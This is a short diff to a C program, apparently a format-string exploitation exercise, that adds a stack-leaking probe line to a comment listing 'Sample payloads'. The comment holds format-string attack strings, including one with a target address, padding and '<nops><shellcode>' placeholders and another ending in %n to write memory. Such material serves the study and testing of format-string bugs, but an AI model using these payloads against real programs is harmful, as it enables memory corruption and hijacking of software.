@@ -26,6 +26,7 @@ int main () {
   /* Sample payloads
   %400s : "%497d\x3c\xd3\xff\xbf<nops><shellcode>"
         : "\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n"
+        : "AAAABBBB|%u%u%u%u%u%u%u%u|%08x|"
   
   */
 }
